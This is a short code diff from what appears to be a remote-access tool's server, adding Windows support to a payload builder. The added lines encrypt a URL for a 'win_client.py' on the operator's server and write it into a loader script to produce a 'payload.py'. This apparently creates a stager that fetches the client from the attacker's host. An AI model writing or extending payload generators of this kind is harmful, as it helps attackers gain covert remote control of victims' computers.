@@ -168,6 +168,8 @@ class server():
             helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload.py'),encryption.encrypt(url.encode(),self.key),self.key)
         elif system == "win":
             payload_path = os.path.join(os.getcwd(), 'base-loader/loader.py')
+            url = self.url + "/win_client.py"
+            helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload.py'),encryption.encrypt(url.encode(),self.key),self.key)
         else:
             helpers.show("GIVE VALID OPERATING SYSTEM (win or linux)", colour="RED", style="BRIGHT", end="\n")   
 
